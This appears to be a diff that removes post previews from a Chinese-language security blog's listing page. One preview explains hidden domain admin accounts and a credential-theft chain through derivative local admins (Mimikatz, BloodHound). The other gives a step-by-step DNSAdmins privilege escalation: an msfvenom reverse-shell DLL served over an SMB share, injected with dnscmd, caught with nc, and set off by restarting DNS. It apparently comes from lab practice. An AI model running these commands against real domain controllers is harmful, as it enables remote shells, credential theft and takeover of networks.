-                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
-                                <span><i class="iconfont icon-shijian"></i>May 19, 2020</span>
-                            </div>
-                        </div>
-                    </a>
-                
-                    <a title="域渗透之隐藏管理员用户和派生本地管理员" alt="域渗透之隐藏管理员用户和派生本地管理员" href="/2020/05/01/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9A%90%E8%97%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7%E5%92%8C%E6%B4%BE%E7%94%9F%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98/"
-                       class="post-item swiper-slide flex flex-v">
-                        <div class="image">
-                            
-                                <img title="域渗透之隐藏管理员用户和派生本地管理员" alt="域渗透之隐藏管理员用户和派生本地管理员"
-                                     src="/images/default.jpg"></img>
-                            
-                        </div>
-                        <div class="content-warp flex1 flex flex-v">
-                            <div class="title">&lt; 域渗透之隐藏管理员用户和派生本地管理员 &gt;</div>
-                            <div class="content flex1">
-                                
-  典型的域权限提升的过程围绕着收集纯文本凭据、或登录到拥有（或者能够获取）系统权限的机子上，获取用户凭据（Mimikatz提取内存凭证）
-常常表现为查找域管理员登录的机子，通过横向，提权等手段获取该机子系统权限，然后转储域管理员凭证。
-这个过程往往伴随着隐藏管理员账户和派生本地管理员的发现
-域隐藏管理账户：
-A是“技术管理”组的成员，”技术管理”组是“ DOMAIN ADMINS”组的成员，因此A是域管理员。
-由于A并不直接在Domain Admins组中，所以当我们直接查询”Domain Admins“组成员时，并不会直接看到A。而是找到“技术管理”组，然后必须通过枚举”技术管理”组才能找到其成员A
-Derivative Local Admins（派生本地管理员）：在我的理解中，派生本地管理员是一种特殊的隐藏管理账户：
-经典案例：（在这个例子中，Sally是WorkStation A中的派生本地管理员）
-
-环境描述：
-
-域组 “Network Ops”是”Wokstation A”的本地管理组的成员（而这里A恰恰是域管成员Tim登录的机子）  
-
-域组”Workstation Admins”是”Workstation B”的本地管理组的成员，Sally和Fred是域组”Workstation B”的成员
-
-Fred同时又是域组”Network Ops”中的成员，Fred在 “Workstation B”上登录
-
-Sally在 “Workstation C”上登录
-
-
-通过获取 “Workstation C”的系统权限，提取Sally的凭证，借助这个凭证访问”Workstation B”，在”Workstation B”提取之后提取Fred凭证，借助Fred凭证获取”Workstation A”的管理员权限。
-直接截取原文中的实际利用步骤：
-
-则可以得出结论：能够获取到作为（域管登录机子）本地管理员组的成员的域组中成员凭据…的其他机子中的用户…即为该机子的派生管理员（手动断句，方便阅读）
-那么我们简化一下上边的图，画出自己的理解图：
-
-隐藏管理员账户可以通过上边例子中的方法手动查找，也可以使用Bloodhound更方便查找
-使用Bloodhound查找隐藏管理账户的几种方法：
-
-Map Domain Trust
-左键点击，直接在视图左侧查看节点信息；或者右键单击一个节点，然后选择子选项“ Expand”以查看该节点的成员
-搜索“Domain Controller“ —-&gt; Group Member（查找组）—-&gt;（左击其中的组）Local Admin Rights–&gt;Derivative Local Admin Rights
-
-
-
-
-                            </div>
-                            <div class="post-tags">
-                                
-                            </div>
-                            <div class="other">
-                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
-                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
-                                <span><i class="iconfont icon-shijian"></i>May 1, 2020</span>
-                            </div>
-                        </div>
-                    </a>
-                
-                    <a title="域控提权之DNSadmins" alt="域控提权之DNSadmins" href="/2020/04/30/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BDNSadmins/"
-                       class="post-item swiper-slide flex flex-v">
-                        <div class="image">
-                            
-                                <img title="域控提权之DNSadmins" alt="域控提权之DNSadmins"
-                                     src="/images/default.jpg"></img>
-                            
-                        </div>
-                        <div class="content-warp flex1 flex flex-v">
-                            <div class="title">&lt; 域控提权之DNSadmins &gt;</div>
-                            <div class="content flex1">
-                                
-  默认情况下，域控也是DNS服务器，微软的DNS服务器作为域控上的服务来运行。通过DNSadmins到System，拿下域控权限
-利用条件：
-拥有DNSAdmins组成员的用户帐户权限，或者当前用户帐户具有对DNS服务器对象的写特权
-whoami /groups  查看用户组
-
-制作dll：
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.67 LPORT=4444 --platform=windows -f dll &gt; plugin.dll开启smb共享：（可通过net use \10.10.14.67\tw 检测是否能连通smbserver  ， 关于smbserver不能连接，排除网络问题之后，可能是共享占用问题，更改共享名称重新开启smbserver即可）
-sudo impacket-smbserver tw .注入dll
-dnscmd.exe 10.10.10.169 /config /serverlevelplugindll \\10.10.14.67\tw\plugin.dll监听：
-nc -lvvp 444重启dns致使paylload生效：
-sc.exe stop dns
-sc.exe start dns或
-sc.exe \\10.10.10.169 stop dns
-sc.exe \\10.10.10.169 start dns  
-
-
-
-                            </div>
-                            <div class="post-tags">
-                                
-                            </div>
-                            <div class="other">
-                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
-                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
-                                <span><i class="iconfont icon-shijian"></i>Apr 30, 2020</span>
                             </div>
                         </div>
                     </a>
